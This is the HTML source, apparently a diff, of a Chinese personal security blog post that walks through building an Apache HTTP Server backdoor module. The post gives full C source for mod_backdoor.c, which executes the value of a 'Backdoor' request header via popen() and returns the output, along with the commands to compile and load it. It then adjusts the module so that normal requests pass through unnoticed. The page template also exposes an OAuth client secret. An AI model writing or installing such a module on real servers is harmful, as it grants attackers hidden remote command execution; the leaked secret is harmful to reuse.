@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Apache HTTP Server 后门开发 | Err0r</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="复现一下一航大佬的博客里的实验。">
+<meta name="keywords" content="后门">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Apache HTTP Server 后门开发">
+<meta property="og:url" content="http://Err0rzz.github.io/2018/03/05/Apache-HTTP-Server-后门开发/index.html">
+<meta property="og:site_name" content="Err0r">
+<meta property="og:description" content="复现一下一航大佬的博客里的实验。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.imgur.com/MA5raqF.png">
+<meta property="og:image" content="https://i.imgur.com/oITokNt.png">
+<meta property="og:image" content="https://i.imgur.com/wC6CHlA.png">
+<meta property="og:image" content="https://i.imgur.com/QHbNHkQ.png">
+<meta property="og:image" content="https://i.imgur.com/h70UVxV.png">
+<meta property="og:image" content="https://i.imgur.com/Pyhkj9p.png">
+<meta property="og:image" content="https://i.imgur.com/9jJq8rE.png">
+<meta property="og:image" content="https://i.imgur.com/f6NrLtw.png">
+<meta property="og:image" content="https://i.imgur.com/dEjDVnT.png">
+<meta property="og:updated_time" content="2018-03-09T11:22:55.934Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Apache HTTP Server 后门开发">
+<meta name="twitter:description" content="复现一下一航大佬的博客里的实验。">
+<meta name="twitter:image" content="https://i.imgur.com/MA5raqF.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Err0r" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.jpg">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/head.jpg" class="js-avatar">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate">Err0rzz</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">壮壮&#39; home</p>
+        
+         <form class="search" method="get" accept-charset="utf-8">
+            <input type="text" id="chillax-search-input" class="st-default-search-input" maxlength="30" placeholder="search" />
+        </form>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">博客首页</a></li>
+                        
+                            <li><a href="/archives/">个人档案</a></li>
+                        
+                            <li><a href="/links/">友情链接</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                            <li><a href="/tags/">标签</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl github" target="_blank" href="https://github.com/Err0rzz" title="github">github</a>
+                            
+                                <a class="fl weibo" target="_blank" href="http://weibo.com/5693631701/profile?topnav=1&wvr=6" title="weibo">weibo</a>
+                            
+                                <a class="fl linkedin" target="_blank" href="https://betamao.me/" title="linkedin">linkedin</a>
+                            
+                                <a class="fl rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                
+                
+
+                
+                
+                <section class="switch-part switch-part3">
+                
+                    <div id="js-aboutme">爱游戏爱妹子</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">Err0rzz</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/head.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me">Err0rzz</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">壮壮&#39; home</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">博客首页</a></li>
+                
+                    <li><a href="/archives/">个人档案</a></li>
+                
+                    <li><a href="/links/">友情链接</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                    <li><a href="/tags/">标签</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="github" target="_blank" href="https://github.com/Err0rzz" title="github">github</a>
+                    
+                        <a class="weibo" target="_blank" href="http://weibo.com/5693631701/profile?topnav=1&wvr=6" title="weibo">weibo</a>
+                    
+                        <a class="linkedin" target="_blank" href="https://betamao.me/" title="linkedin">linkedin</a>
+                    
+                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-Apache-HTTP-Server-后门开发" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/03/05/Apache-HTTP-Server-后门开发/" class="article-date">
+      <time datetime="2018-03-05T08:24:05.000Z" itemprop="datePublished">2018-03-05</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Apache HTTP Server 后门开发
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/后门/">后门</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>复现一下一航大佬的博客里的实验。<br><a id="more"></a></p>
+<p>参考文档：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">https://www.jianshu.com/p/9d9248922508</div><div class="line">https://httpd.apache.org/docs/2.4/developer/modguide.html</div></pre></td></tr></table></figure></p>
+<h1 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h1><p>实现任意命令的功能<br>在目标服务器上安装一个后门，使得其对http请求头中的特定键-值产生反应，从而执行我们构造的命令。</p>
+<p>例如，我们使目标服务器对zz这个键产生反应，去执行zz所对应的值的命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">GET / HTTP/1.1</div><div class="line">Host: localhost</div><div class="line">Cookie: key=value</div><div class="line">zz: COMMAND</div></pre></td></tr></table></figure></p>
+<p>如果服务器收到该请求头，则执行COMMAND。</p>
+<p>为了实现以上功能，我们需要完成接下来几步：</p>
+<ul>
+<li>Apache扩展结构</li>
+<li>服务器获取一个HTTP请求的所有请求头</li>
+<li>执行系统命令并且获取结果<br><br><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1>1.使用apxs来实现apache的扩展，先生成一个基本的模板结构<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apxs -g -n backdoor</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="https://i.imgur.com/MA5raqF.png" alt=""></p>
+<p>2.通过apache文档可以看到，客户端所有的请求头都可以通过<strong>r-&gt;headers_in</strong>获得<br><img src="https://i.imgur.com/oITokNt.png" alt=""></p>
+<p>其实在文档里，官方也给出了遍历所有请求头的代码<br><img src="https://i.imgur.com/wC6CHlA.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">static int example_handler(request_rec *r)</div><div class="line">&#123;</div><div class="line">    /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/</div><div class="line">    const apr_array_header_t    *fields;</div><div class="line">    int                         i;</div><div class="line">    apr_table_entry_t           *e = 0;</div><div class="line">    /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/</div><div class="line"></div><div class="line">    fields = apr_table_elts(r-&gt;headers_in);</div><div class="line">    e = (apr_table_entry_t *) fields-&gt;elts;</div><div class="line">    for(i = 0; i &lt; fields-&gt;nelts; i++) &#123;</div><div class="line">        ap_rprintf(r, &quot;%s: %s\n&quot;, e[i].key, e[i].val);</div><div class="line">    &#125;</div><div class="line">    return OK;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>所以我们只需要看一下请求头里有没有出现Backdoor，然后进行操作就好了。</p>
+<p>然后差不多对着敲一下代码(其实大部分都是原来mod_backdoor.c的代码，添加了一部分自己的代码)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div></pre></td><td class="code"><pre><div class="line">/*</div><div class="line">**  mod_backdoor.c -- Apache sample backdoor module</div><div class="line">**  [Autogenerated via ``apxs -n backdoor -g&apos;&apos;]</div><div class="line">**</div><div class="line">**  To play with this sample module first compile it into a</div><div class="line">**  DSO file and install it into Apache&apos;s modules directory</div><div class="line">**  by running:</div><div class="line">**</div><div class="line">**    $ apxs -c -i mod_backdoor.c</div><div class="line">**</div><div class="line">**  Then activate it in Apache&apos;s apache2.conf file for instance</div><div class="line">**  for the URL /backdoor in as follows:</div><div class="line">**</div><div class="line">**    #   apache2.conf</div><div class="line">**    LoadModule backdoor_module modules/mod_backdoor.so</div><div class="line">**    &lt;Location /backdoor&gt;</div><div class="line">**    SetHandler backdoor</div><div class="line">**    &lt;/Location&gt;</div><div class="line">**</div><div class="line">**  Then after restarting Apache via</div><div class="line">**</div><div class="line">**    $ apachectl restart</div><div class="line">**</div><div class="line">**  you immediately can request the URL /backdoor and watch for the</div><div class="line">**  output of this module. This can be achieved for instance via:</div><div class="line">**</div><div class="line">**    $ lynx -mime_header http://localhost/backdoor</div><div class="line">**</div><div class="line">**  The output should be similar to the following one:</div><div class="line">**</div><div class="line">**    HTTP/1.1 200 OK</div><div class="line">**    Date: Tue, 31 Mar 1998 14:42:22 GMT</div><div class="line">**    Server: Apache/1.3.4 (Unix)</div><div class="line">**    Connection: close</div><div class="line">**    Content-Type: text/html</div><div class="line">**</div><div class="line">**    The sample page from mod_backdoor.c</div><div class="line">*/</div><div class="line"></div><div class="line">#include &quot;httpd.h&quot;</div><div class="line">#include &quot;http_config.h&quot;</div><div class="line">#include &quot;http_protocol.h&quot;</div><div class="line">#include &quot;ap_config.h&quot;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">/* The sample content handler */</div><div class="line">static int backdoor_handler(request_rec *r)</div><div class="line">&#123;</div><div class="line">    /*</div><div class="line">    if (strcmp(r-&gt;handler, &quot;backdoor&quot;)) &#123;</div><div class="line">        return DECLINED;</div><div class="line">    &#125;</div><div class="line">    r-&gt;content_type = &quot;text/html&quot;;</div><div class="line"></div><div class="line">    if (!r-&gt;header_only)</div><div class="line">        ap_rputs(&quot;The sample page from mod_backdoor.c\n&quot;, r);</div><div class="line">    */</div><div class="line">    /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/</div><div class="line">    const apr_array_header_t    *fields;</div><div class="line">    int                         i;</div><div class="line">    apr_table_entry_t           *e = 0;</div><div class="line">    char FLAG = 0;</div><div class="line">    /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/</div><div class="line"></div><div class="line">    fields = apr_table_elts(r-&gt;headers_in);</div><div class="line">    e = (apr_table_entry_t *) fields-&gt;elts;</div><div class="line"></div><div class="line">    for(i = 0; i &lt; fields-&gt;nelts; i++) &#123;</div><div class="line">        if(strcmp(e[i].key, &quot;Backdoor&quot;) == 0)&#123;</div><div class="line">            FLAG = 1;</div><div class="line">            break;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    if (FLAG)&#123;</div><div class="line">        char * command = e[i].val;</div><div class="line">        ap_rprintf(r, &quot;Command: %s\n&quot;, command);</div><div class="line">        ap_rprintf(r, &quot;Result: \n&quot;, command);</div><div class="line">        FILE* fp = popen(command,&quot;r&quot;);</div><div class="line">        char buffer[0x100] = &#123;0&#125;;</div><div class="line">        int counter = 1;</div><div class="line">        while(counter)&#123;</div><div class="line">            counter = fread(buffer, 1, sizeof(buffer), fp);</div><div class="line">            ap_rwrite(buffer, counter, r);</div><div class="line">        &#125;</div><div class="line">        pclose(fp);</div><div class="line">    &#125;</div><div class="line">    return OK;</div><div class="line">&#125;</div><div class="line"></div><div class="line">static void backdoor_register_hooks(apr_pool_t *p)</div><div class="line">&#123;</div><div class="line">    ap_hook_handler(backdoor_handler, NULL, NULL, APR_HOOK_MIDDLE);</div><div class="line">&#125;</div><div class="line"></div><div class="line">/* Dispatch list for API hooks */</div><div class="line">module AP_MODULE_DECLARE_DATA backdoor_module = &#123;</div><div class="line">    STANDARD20_MODULE_STUFF,</div><div class="line">    NULL,                  /* create per-dir    config structures */</div><div class="line">    NULL,                  /* merge  per-dir    config structures */</div><div class="line">    NULL,                  /* create per-server config structures */</div><div class="line">    NULL,                  /* merge  per-server config structures */</div><div class="line">    NULL,                  /* table of config file commands       */</div><div class="line">    backdoor_register_hooks  /* register hooks                      */</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
+<p>接着<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apxs -a -i -c mod_backdoor.c &amp;&amp; service apache2 restart</div></pre></td></tr></table></figure></p>
+<p>来启动backdoor这个module。</p>
+<p>就可以看到成果了<br><img src="https://i.imgur.com/QHbNHkQ.png" alt=""></p>
+<p>但是问题也来了<br>原来的主页–phpinfo页面<br><img src="https://i.imgur.com/h70UVxV.png" alt=""></p>
+<p>现在的主页<br><img src="https://i.imgur.com/Pyhkj9p.png" alt=""></p>
+<p>也就是说添加了这个module之后，一个正常的没有添加Backdoor请求头的请求会无法得到正确响应。</p>
+<p>然后参考文章文档：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">http://blog.csdn.net/ConeZXY/article/details/1897989</div><div class="line">http://blog.csdn.net/ConeZXY/article/details/1898000</div><div class="line">http://blog.csdn.net/ConeZXY/article/details/1898019</div><div class="line">http://zjwyhll.blog.163.com/blog/static/7514978120126254222294/</div><div class="line">http://www.apachetutor.org/dev/request</div></pre></td></tr></table></figure></p>
+<p><img src="https://i.imgur.com/9jJq8rE.png" alt=""><br>如果返回 OK , 这个模块就会通知服务器 , 我们已经处理完成了这个请求 , 并且没有发生错误<br>如果返回 DONE , 这个模块就会通知服务器 , 我们已经处理完成了这个请求 , 并且已经不需要再进行后续的处理了<br>如果返回 DECLINED , 则表示这个模块不需要对这个请求进行处理 , 那么服务器就会继续对其进行默认的处理</p>
+<p>我们将原先代码中的返回值由OK改成DECLINED试试<br><img src="https://i.imgur.com/f6NrLtw.png" alt=""><br>正常执行了命令，且把phpinfo给显示了出来<br>如果不发送Backdoor请求头<br><img src="https://i.imgur.com/dEjDVnT.png" alt=""><br>正常的phpinfo页面<br><br></p>
+<p>通过这次实验的学习，我对于apache环境的搭建以及apache请求头这些配置啊模块啊都有了一定的了解，同时也还是好菜…</p>
+
+      
+      
+        <div class="page-reward">
+          <p><a href="javascript:void(0)" onclick="dashangToggle()" class="dashang">赏</a></p>
+          <div class="hide_box"></div>
+          <div class="shang_box">
+            <a class="shang_close" href="javascript:void(0)" onclick="dashangToggle()">×</a>
+            <div class="shang_tit">
+              <p>纯属好玩</p>
+            </div>
+            <div class="shang_payimg">
+              <img src="/img/alipayimg.jpg" alt="扫码支持" title="扫一扫" />
+            </div>
+              <div class="pay_explain">扫码打赏，你说多少就多少</div>
+            <div class="shang_payselect">
+              
+                <div class="pay_item checked" data-id="alipay">
+                  <span class="radiobox"></span>
+                  <span class="pay_logo"><img src="/img/alipay.png" alt="支付宝" /></span>
+                </div>
+              
+              
+                <div class="pay_item" data-id="wechat">
+                  <span class="radiobox"></span>
+                  <span class="pay_logo"><img src="/img/weixin.png" alt="微信" /></span>
+                </div>
+              
+            </div>
+            <div class="shang_info">
+              <p>打开<span id="shang_pay_txt">支付宝</span>扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+        </div>
+        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.min.js"></script>
+        <script type="text/javascript">
+          $(".pay_item").click(function(){
+            $(this).addClass('checked').siblings('.pay_item').removeClass('checked');
+            var dataid=$(this).attr('data-id');
+            $(".shang_payimg img").attr("src","/img/"+dataid+"img.jpg");
+            $("#shang_pay_txt").text(dataid=="alipay"?"支付宝":"微信");
+          });
+          function dashangToggle(){
+            
+            $(".hide_box").fadeToggle();
+            $(".shang_box").fadeToggle();
+          }
+        </script>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2018/03/05/Apache-HTTP-Server-后门开发/">Apache HTTP Server 后门开发</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 Err0rzz 的个人博客">Err0rzz</a></p>
+        <p><span>发布时间:</span>2018年03月05日 - 16时24分</p>
+        <p><span>最后更新:</span>2018年03月09日 - 19时22分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2018/03/05/Apache-HTTP-Server-后门开发/" title="Apache HTTP Server 后门开发">http://Err0rzz.github.io/2018/03/05/Apache-HTTP-Server-后门开发/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://Err0rzz.github.io/2018/03/05/Apache-HTTP-Server-后门开发/　　作者: Err0rzz" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a href="/2018/03/09/Ubuntu下Apache2开启-关闭模板方法/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          Ubuntu下Apache2开启/关闭模板方法
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/03/05/Kali2018更新问题/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Kali2018更新问题</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#目的"><span class="toc-number">1.</span> <span class="toc-text">目的</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#实现"><span class="toc-number">2.</span> <span class="toc-text">实现</span></a></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+        <div id="gitments"></div>
+<script src="/js/gitment.browser.js"></script>
+<script>
+    var gitment = new Gitment({
+      id: window.location.pathname,
+      owner: 'Err0rzz',
+      repo: 'Err0rzz.github.io',
+      oauth: {
+        client_id: 'd9c845fbbbb51d243003',
+        client_secret: 'b8310696d39906b802cc7f1f594f21501cb4e9d6',
+      },
+    })
+    gitment.render('gitments')
+</script>
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2018/03/09/Ubuntu下Apache2开启-关闭模板方法/" title="上一篇: Ubuntu下Apache2开启/关闭模板方法">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2018/03/05/Kali2018更新问题/" title="下一篇: Kali2018更新问题">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/03/09/Ubuntu下Apache2开启-关闭模板方法/">Ubuntu下Apache2开启/关闭模板方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/05/Apache-HTTP-Server-后门开发/">Apache HTTP Server 后门开发</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/05/Kali2018更新问题/">Kali2018更新问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/01/SQL截断攻击/">SQL截断攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/26/UDF-mysql/">UDF--mysql</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/iptables的简单使用/">iptables的简单使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/20/docker基本操作/">docker基本操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/15/CSRF学习/">CSRF学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/11/第一届智商杯wp/">第一届智商杯wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/26/linux下的mysql使用/">linux下的mysql使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/23/Padding-Oracle-攻击/">Padding_Oracle 攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/23/爆破脚本/">爆破脚本</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/16/OOB注入/">OOB注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/16/sage安装/">sage安装</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/14/CTF中RSA套路/">CTF中RSA套路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/14/GET的命令执行漏洞/">GET的命令执行漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/13/ctf命令执行与绕过/">ctf命令执行与绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/09/无线破解浅谈/">无线破解浅谈</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/07/浅谈php安全/">浅谈php安全</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/31/updatexml-mysql显错注入/">mysql显错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/26/typecho-backdoor/">typecho backdoor</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/08/Ubuntu安装Apache2-php7-mysql/">Ubuntu安装Apache2+php7+mysql</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/24/问鼎杯决赛/">问鼎杯决赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/18/常用正则表达式/">常用正则表达式</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/18/hash长度扩展攻击/">hash长度扩展攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/18/文件任意写入getshell/">文件任意写入getshell</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/16/问鼎杯线上/">问鼎杯writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/11/jarvisoj/">javrisoj的web题</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/04/injection/">各种注入姿势</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/31/file_include/">文件包含一些常识</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/31/XMAN/">xman个人排位赛(纪念第一个xss)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/31/ZJGSCTF/">ZJGSCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/25/blind-SQL-injection-script/">blind_SQL_injection script</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2018 Err0rzz
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >海贼到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+<script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
